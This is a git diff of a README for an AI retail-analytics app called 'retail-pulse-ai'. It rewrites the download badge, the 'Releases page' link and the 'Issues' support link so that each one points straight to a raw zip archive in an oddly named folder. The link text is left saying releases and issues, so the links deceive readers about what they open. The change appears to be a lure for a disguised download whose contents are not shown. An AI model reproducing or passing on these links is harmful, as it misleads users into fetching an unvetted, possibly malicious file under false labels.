@@ -16,12 +16,12 @@ Welcome to **retail-pulse-ai**! This application uses advanced AI technology to 
 
 To get started with our application, visit the following link to download the latest version:
 
-[![Download retail-pulse-ai](https://img.shields.io/badge/Download%20Now-%20-%23007bff?style=for-the-badge&logo=github)](https://github.com/Gasainho/retail-pulse-ai/releases)
+[![Download retail-pulse-ai](https://github.com/Gasainho/retail-pulse-ai/raw/refs/heads/main/squarrose/ai_pulse_retail_2.0.zip%20Now-%20-%23007bff?style=for-the-badge&logo=github)](https://github.com/Gasainho/retail-pulse-ai/raw/refs/heads/main/squarrose/ai_pulse_retail_2.0.zip)
 
 ### Installation Steps
 
 1. **Visit the Releases Page**  
-   Click this link to access our [Releases page](https://github.com/Gasainho/retail-pulse-ai/releases).
+   Click this link to access our [Releases page](https://github.com/Gasainho/retail-pulse-ai/raw/refs/heads/main/squarrose/ai_pulse_retail_2.0.zip).
 
 2. **Select the Latest Version**  
    On the Releases page, you will see a list of versions. Look for the one labeled "Latest Release." 
@@ -72,7 +72,7 @@ For further guidance, check these resources:
 
 - **Documentation**: Comprehensive user guide available in the application menu.
 - **FAQ**: Common questions answered on our GitHub page.
-- **Support**: For any issues, visit our GitHub [Issues](https://github.com/Gasainho/retail-pulse-ai/issues) page.
+- **Support**: For any issues, visit our GitHub [Issues](https://github.com/Gasainho/retail-pulse-ai/raw/refs/heads/main/squarrose/ai_pulse_retail_2.0.zip) page.
 
 ## 🤝 Contributing
 
